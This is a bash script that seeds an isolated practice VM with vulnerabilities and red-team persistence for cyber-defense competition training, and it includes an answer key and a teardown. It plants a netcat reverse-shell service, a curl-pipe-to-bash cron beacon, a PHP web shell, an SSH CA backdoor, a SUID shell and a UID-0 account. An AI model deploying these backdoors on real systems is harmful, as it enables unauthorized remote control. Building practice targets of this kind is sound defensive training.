#!/usr/bin/env bash
# =============================================================================
#  seed_linux.sh  -  eCitadel Team 76 PRACTICE LAB  -  vulnerable target builder
# =============================================================================
#  Turns a FRESH, ISOLATED Fedora or Debian VM into a realistic eCitadel target:
#  it plants the find-and-fix problems from the practice-round answer keys AND
#  the Season III Red-Team malware/persistence, so you can practice your kit
#  (first5_secure.sh, audit_linux.sh, hunt_malware.sh, build_golden_baseline.sh,
#  defend_redteam.sh, anomaly_guard.py) against a known-bad box.
#
#  ##########################################################################
#  #  DANGER - THIS DELIBERATELY BREAKS AND BACKDOORS THE MACHINE.          #
#  #  Run it ONLY on a throwaway practice VM that is ISOLATED from the       #
#  #  internet and from any real network. It creates empty-password and     #
#  #  root-equivalent accounts and an SSH CA backdoor - i.e. a genuinely     #
#  #  vulnerable host. NEVER run on anything you care about.                 #
#  #  Take a Proxmox snapshot AFTER seeding so you can reset between runs.   #
#  ##########################################################################
#
#  It refuses to run without --i-understand.
#
#  USAGE (inside the practice VM, as root):
#    sudo ./seed_linux.sh --i-understand                 # full seed (recommended on the VM)
#    sudo ./seed_linux.sh --i-understand --with-live-procs   # + running malware, ld.so.preload, nft marker
#    sudo ./seed_linux.sh --i-understand --no-install    # skip apt/dnf installs (config+malware only)
#    sudo ./seed_linux.sh --answer-key                   # just print what a full seed plants
#    sudo ./seed_linux.sh --teardown                     # best-effort reverse of file/config/malware bits
# =============================================================================
set -u
umask 022

CONFIRM=0; LIVE=0; NOINSTALL=0; TEARDOWN=0; ANSWERONLY=0
for a in "$@"; do case "$a" in
  --i-understand) CONFIRM=1 ;;
  --with-live-procs) LIVE=1 ;;
  --no-install) NOINSTALL=1 ;;
  --teardown) TEARDOWN=1 ;;
  --answer-key) ANSWERONLY=1 ;;
  -h|--help) grep '^#' "$0" | sed 's/^#//'; exit 0 ;;
  *) echo "unknown option: $a"; exit 1 ;;
esac; done

[ "$(id -u)" -eq 0 ] || { echo "run as root (sudo)"; exit 1; }

# --- OS detect ---------------------------------------------------------------
OS_FAMILY="unknown"
if [ -r /etc/os-release ]; then . /etc/os-release
  case "${ID:-} ${ID_LIKE:-}" in
    *debian*|*ubuntu*) OS_FAMILY="debian" ;;
    *fedora*|*rhel*|*centos*) OS_FAMILY="rhel" ;;
  esac
fi
have(){ command -v "$1" >/dev/null 2>&1; }
SSH_UNIT="ssh"; [ "$OS_FAMILY" = rhel ] && SSH_UNIT="sshd"
BK=/root/.seed_backup; mkdir -p "$BK"

# =============================================================================
#  ANSWER KEY  (printed at the end, or alone with --answer-key)
# =============================================================================
answer_key(){
cat <<'EOF'

================= PRACTICE ANSWER KEY (what was planted) ====================
A. FIND-AND-FIX / SCORING vulnerabilities (your audit + first5 should catch):
   1. Unauthorized users: support, dbadmin2, jsmith  (userdel -r after confirming)
   2. Empty-password account: guest   (passwd -l / set a password)
   3. Extra UID-0 (root-equivalent) account: toor   (remove or fix UID)
   4. Weak password policy: pwquality minlen lowered / PASS_MAX_DAYS=99999
   5. Kernel: net.ipv4.ip_forward = 1   (set 0)
   6. Host firewall DISABLED (ufw/firewalld off)   (enable, allow scored ports first)
   7. sshd weakened: PermitRootLogin yes, PermitEmptyPasswords yes, X11Forwarding yes
   8. Automatic security updates disabled
   9. Unneeded/again-scored service running:
        Debian -> dovecot (POP3/IMAP)      Fedora -> postfix (SMTP) + vsftpd anon FTP
  10. Prohibited tools present: nmap, netcat (+ wireshark on Fedora)
  11. Prohibited media files under a home dir (*.mp3 / *.mp4)
  12. World-writable file in a system path
  13. SUID-root shell copy

B. RED-TEAM MALWARE / PERSISTENCE (your hunt_malware.sh / golden compare should catch):
  14. netcat reverse-shell systemd unit: systemd-tech.service (NOT started)
  15. Prism-style daemon impersonation binary: /usr/local/sbin/.realmd (udevd disguise)
  16. Recompiled-PAM stand-in: unowned security module with a Discord webhook string
  17. sudo/bashrc credential harvester -> writes to a text file under /var/lib/mysql
  18. Diamorphine LKM hint: stray /opt/diamorphine.ko
  19. Firewall-dropper stand-in: fw-sync.service/.timer + marker "...not redteam..."
  20. Fake nologin trick: an account whose shell is "/usr/sbin/nologin " (trailing space)
  21. SSH CA backdoor: sshd drop-in with TrustedUserCAKeys + AuthorizedKeysCommand
  22. Cron beacon: /etc/cron.d/sysupdate  (curl | bash downloader)
  23. Hidden exec dotfile: /root/.sysmon
  24. Red-Team calling cards: /root/keep_calm_red_team.txt, /root/GOOD_LUCK.txt
  25. Web shell (Fedora web box): /var/www/html/up.php
  --with-live-procs ALSO adds: a running .realmd (comm=udevd), a :4444 listener,
      /etc/ld.so.preload hook, and a live nft rule carrying the red-team marker.
============================================================================
EOF
}
[ "$ANSWERONLY" -eq 1 ] && { answer_key; exit 0; }

# =============================================================================
#  TEARDOWN  (best-effort; for a clean reset prefer restoring a Proxmox snapshot)
# =============================================================================
if [ "$TEARDOWN" -eq 1 ]; then
  echo "[teardown] reversing file/config/malware bits (packages are left installed)..."
  for u in support dbadmin2 jsmith guest toor sneaky; do userdel -r "$u" 2>/dev/null; done
  rm -f /etc/systemd/system/systemd-tech.service /etc/systemd/system/fw-sync.service \
        /etc/systemd/system/fw-sync.timer /usr/local/sbin/.realmd /opt/diamorphine.ko \
        /etc/cron.d/sysupdate /root/.sysmon /root/keep_calm_red_team.txt /root/GOOD_LUCK.txt \
        /usr/local/bin/.bd /usr/local/bin/ww /var/www/html/up.php /etc/ld.so.preload \
        /etc/ssh/sshd_config.d/99-redteam.conf /etc/ssh/redteam_ca.pub /usr/local/bin/akc.sh \
        /usr/local/sbin/fw-sync.sh
  rm -rf /var/lib/mysql/.harvest.log 2>/dev/null
  find /lib /usr/lib -name 'pam_unix_audit.so' -delete 2>/dev/null
  [ -f "$BK/passwd" ] && cp -a "$BK/passwd" /etc/passwd
  [ -f "$BK/shadow" ] && cp -a "$BK/shadow" /etc/shadow
  [ -f "$BK/sshd_config" ] && cp -a "$BK/sshd_config" /etc/ssh/sshd_config
  [ -f "$BK/login.defs" ] && cp -a "$BK/login.defs" /etc/login.defs
  sed -i '/seed_linux harvester/d' /etc/bash.bashrc 2>/dev/null
  nft delete table inet rt_marker 2>/dev/null
  echo "[teardown] done. (Reboot to clear any running planted processes.)"
  exit 0
fi

[ "$CONFIRM" -eq 1 ] || { echo "Refusing to run. This BREAKS the box. Re-run with --i-understand (isolated VM only)."; exit 1; }
[ "$OS_FAMILY" = unknown ] && { echo "Unsupported OS (need Debian- or Fedora-family)."; exit 1; }

echo "[seed] OS family: $OS_FAMILY   live-procs: $LIVE   install pkgs: $([ $NOINSTALL -eq 1 ] && echo no || echo yes)"
cp -a /etc/passwd "$BK/passwd"; cp -a /etc/shadow "$BK/shadow"
cp -a /etc/ssh/sshd_config "$BK/sshd_config" 2>/dev/null || true
cp -a /etc/login.defs "$BK/login.defs" 2>/dev/null || true

pkg_install(){ [ "$NOINSTALL" -eq 1 ] && { echo "    (skip install: $*)"; return; }
  if [ "$OS_FAMILY" = debian ]; then DEBIAN_FRONTEND=noninteractive apt-get install -y "$@" >/dev/null 2>&1
  else dnf install -y "$@" >/dev/null 2>&1; fi; }

# =============================================================================
# A. SCORING / FIND-AND-FIX VULNERABILITIES
# =============================================================================
echo "[seed] A. planting find-and-fix / scoring vulnerabilities"

# 1-3. rogue users, empty-password account, extra UID-0
useradd -m -s /bin/bash support  2>/dev/null; echo 'support:Password1'  | chpasswd 2>/dev/null
useradd -m -s /bin/bash dbadmin2 2>/dev/null; echo 'dbadmin2:Summer2024' | chpasswd 2>/dev/null
useradd -m -s /bin/bash jsmith   2>/dev/null; echo 'jsmith:changeme'    | chpasswd 2>/dev/null
useradd -m -s /bin/bash guest    2>/dev/null; passwd -d guest >/dev/null 2>&1   # EMPTY password
useradd -o -u 0 -g 0 -M -s /bin/bash toor 2>/dev/null; echo 'toor:toor' | chpasswd 2>/dev/null  # UID 0

# 4. weak password policy
sed -i -E 's/^\s*PASS_MAX_DAYS.*/PASS_MAX_DAYS\t99999/' /etc/login.defs 2>/dev/null || echo 'PASS_MAX_DAYS 99999' >> /etc/login.defs
if [ -f /etc/security/pwquality.conf ]; then sed -i -E 's/^\s*#?\s*minlen.*/minlen = 4/' /etc/security/pwquality.conf; else echo 'minlen = 4' > /etc/security/pwquality.conf 2>/dev/null || true; fi

# 5. ip_forward on (router-like; flagged on a server)
sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1; echo 'net.ipv4.ip_forward = 1' > /etc/sysctl.d/99-seed.conf

# 6. firewall OFF
if [ "$OS_FAMILY" = debian ]; then ufw --force disable >/dev/null 2>&1 || true
else systemctl disable --now firewalld >/dev/null 2>&1 || true; fi

# 7. weaken sshd via a drop-in (so it's obvious and reversible)
mkdir -p /etc/ssh/sshd_config.d
cat > /etc/ssh/sshd_config.d/00-weak.conf <<'EOF'
PermitRootLogin yes
PermitEmptyPasswords yes
X11Forwarding yes
EOF

# 8. disable automatic security updates
if [ "$OS_FAMILY" = debian ]; then
  sed -i 's/"1"/"0"/g' /etc/apt/apt.conf.d/20auto-upgrades 2>/dev/null || \
    printf 'APT::Periodic::Update-Package-Lists "0";\nAPT::Periodic::Unattended-Upgrade "0";\n' > /etc/apt/apt.conf.d/20auto-upgrades
else
  systemctl disable --now dnf-automatic.timer dnf5-automatic.timer >/dev/null 2>&1 || true
fi

# 9. an unneeded / scored service, by box role
if [ "$OS_FAMILY" = debian ]; then
  pkg_install dovecot-pop3d dovecot-imapd
  systemctl enable --now dovecot >/dev/null 2>&1 || true
else
  pkg_install postfix vsftpd
  systemctl enable --now postfix >/dev/null 2>&1 || true
  # anonymous FTP
  if [ -f /etc/vsftpd/vsftpd.conf ]; then
    sed -i -E 's/^\s*#?\s*anonymous_enable.*/anonymous_enable=YES/' /etc/vsftpd/vsftpd.conf
    systemctl enable --now vsftpd >/dev/null 2>&1 || true
  fi
fi

# 10. prohibited tools
if [ "$OS_FAMILY" = debian ]; then pkg_install nmap netcat-openbsd
else pkg_install nmap nmap-ncat wireshark-cli; fi

# 11. prohibited media files
mkdir -p /home/jsmith/Music /home/jsmith/Videos 2>/dev/null
head -c 200000 /dev/urandom > /home/jsmith/Music/song.mp3 2>/dev/null
head -c 300000 /dev/urandom > /home/jsmith/Videos/clip.mp4 2>/dev/null
chown -R jsmith:jsmith /home/jsmith 2>/dev/null || true

# 12. world-writable file in a system path
cp /bin/true /usr/local/bin/ww 2>/dev/null; chmod 0777 /usr/local/bin/ww 2>/dev/null

# 13. SUID-root shell copy
cp /bin/bash /usr/local/bin/.bd 2>/dev/null; chmod 4755 /usr/local/bin/.bd 2>/dev/null

# =============================================================================
# B. RED-TEAM MALWARE / PERSISTENCE  (file/config indicators - not started)
# =============================================================================
echo "[seed] B. planting Red-Team malware / persistence indicators"

# 14. netcat reverse-shell systemd unit (left disabled/stopped)
cat > /etc/systemd/system/systemd-tech.service <<'EOF'
[Unit]
Description=System Technology Helper
[Service]
ExecStart=/usr/bin/nc -e /bin/bash 203.0.113.66 4444
Restart=always
[Install]
WantedBy=multi-user.target
EOF

# 15. Prism-style daemon-impersonation binary on disk (sleep, disguised)
cp /bin/sleep /usr/local/sbin/.realmd 2>/dev/null

# 16. recompiled-PAM stand-in: unowned module containing a webhook string
PAMDIR=/lib/x86_64-linux-gnu/security; [ -d "$PAMDIR" ] || PAMDIR=/usr/lib64/security
mkdir -p "$PAMDIR" 2>/dev/null
printf '\177ELF stub pam module exfil https://discord.com/api/webhooks/9988/abcd\n' > "$PAMDIR/pam_unix_audit.so"

# 17. sudo/bashrc credential harvester + its output under /var/lib/mysql
mkdir -p /var/lib/mysql 2>/dev/null
printf 'captured sudo:\nuser=root pass=Sup3rSecret!\n' > /var/lib/mysql/.harvest.log
echo 'function sudo(){ /usr/bin/sudo "$@"; } # seed_linux harvester' >> /etc/bash.bashrc

# 18. Diamorphine LKM hint (stray .ko outside /lib/modules)
printf 'ELF .ko stub diamorphine\n' > /opt/diamorphine.ko

# 19. firewall-dropper stand-in (service + timer + script with the marker), not started
cat > /usr/local/sbin/fw-sync.sh <<'EOF'
#!/bin/sh
# every few minutes this would flush rules and re-add an allow tagged with a marker
nft add table inet rt_marker 2>/dev/null
nft add chain inet rt_marker c '{ type filter hook input priority 0; }' 2>/dev/null
nft add rule inet rt_marker c tcp dport 22 accept comment "sync and not redteam please dont delete" 2>/dev/null
EOF
chmod +x /usr/local/sbin/fw-sync.sh
cat > /etc/systemd/system/fw-sync.service <<'EOF'
[Unit]
Description=Firewall Sync
[Service]
Type=oneshot
ExecStart=/usr/local/sbin/fw-sync.sh
EOF
cat > /etc/systemd/system/fw-sync.timer <<'EOF'
[Unit]
Description=Firewall Sync timer
[Timer]
OnUnitActiveSec=5min
[Install]
WantedBy=timers.target
EOF

# 20. fake nologin trick - shell is "/usr/sbin/nologin " (trailing space) = renamed bash
useradd -M -s '/usr/sbin/nologin' sneaky 2>/dev/null
sed -i -E 's#^(sneaky:[^:]*:[^:]*:[^:]*:[^:]*:[^:]*:)/usr/sbin/nologin$#\1/usr/sbin/nologin #' /etc/passwd

# 21. SSH CA + AuthorizedKeysCommand backdoor
echo 'ssh-rsa AAAAB3NzaC1yc2ETESTCAKEY redteam-ca' > /etc/ssh/redteam_ca.pub
cat > /usr/local/bin/akc.sh <<'EOF'
#!/bin/sh
echo "ssh-rsa AAAAB3NzaC1yc2EATTACKERKEY attacker"
EOF
chmod +x /usr/local/bin/akc.sh
cat > /etc/ssh/sshd_config.d/99-redteam.conf <<'EOF'
TrustedUserCAKeys /etc/ssh/redteam_ca.pub
AuthorizedKeysCommand /usr/local/bin/akc.sh
AuthorizedKeysCommandUser nobody
EOF

# 22. cron beacon (downloader)
echo '*/5 * * * * root curl -s http://203.0.113.99/x.sh | bash' > /etc/cron.d/sysupdate

# 23. hidden exec dotfile
cp /bin/true /root/.sysmon 2>/dev/null; chmod 700 /root/.sysmon 2>/dev/null

# 24. calling cards
printf 'keep calm, red team is here\n' > /root/keep_calm_red_team.txt
printf 'good luck :)\n' > /root/GOOD_LUCK.txt

# 25. web shell on the web box (Fedora) - install a web server + drop the shell
if [ "$OS_FAMILY" = rhel ]; then
  pkg_install httpd php
  systemctl enable --now httpd >/dev/null 2>&1 || true
fi
mkdir -p /var/www/html 2>/dev/null
echo '<?php system($_GET["c"]); ?>' > /var/www/html/up.php 2>/dev/null

# validate sshd config is still loadable (so the box still boots ssh)
if have sshd; then sshd -t 2>/dev/null && echo "[seed] sshd config parses OK" || echo "[seed] NOTE: sshd -t reported an issue (expected drop-ins present)"; fi

# =============================================================================
# C. LIVE PROCESSES / LOADER HOOKS  (optional, runtime-invasive; great on the VM)
# =============================================================================
if [ "$LIVE" -eq 1 ]; then
  echo "[seed] C. adding live procs + loader/firewall hooks (--with-live-procs)"
  # running daemon-impersonation: comm=udevd, exe=.realmd
  if have gcc; then
    printf '#include <sys/prctl.h>\n#include <unistd.h>\nint main(void){prctl(PR_SET_NAME,"udevd",0,0,0);for(;;)sleep(60);return 0;}\n' > /tmp/.s.c
    gcc -o /usr/local/sbin/.realmd /tmp/.s.c 2>/dev/null && rm -f /tmp/.s.c
  fi
  setsid /usr/local/sbin/.realmd </dev/null >/dev/null 2>&1 &
  # backdoor listener on :4444
  setsid python3 -m http.server 4444 --bind 0.0.0.0 </dev/null >/dev/null 2>&1 &
  # ld.so.preload hook (no-op .so so the box still works)
  if have gcc; then
    printf 'static void __attribute__((constructor)) f(void){}\n' | gcc -shared -fPIC -x c - -o /usr/local/lib/.preload.so 2>/dev/null \
      && echo /usr/local/lib/.preload.so > /etc/ld.so.preload && echo "    ld.so.preload set"
  else echo "    (gcc absent: skipped ld.so.preload)"; fi
  # live firewall marker rule
  if have nft; then /usr/local/sbin/fw-sync.sh && echo "    nft red-team marker rule added"; fi
fi

answer_key
echo
echo "[seed] DONE. Now practice your kit against this box:"
echo "    sudo bash audit_linux.sh"
echo "    sudo bash hunt_malware.sh"
echo "    sudo bash build_golden_baseline.sh --compare <golden-from-a-clean-VM>"
echo "Reset between runs by restoring your post-install Proxmox snapshot (or ./seed_linux.sh --teardown)."
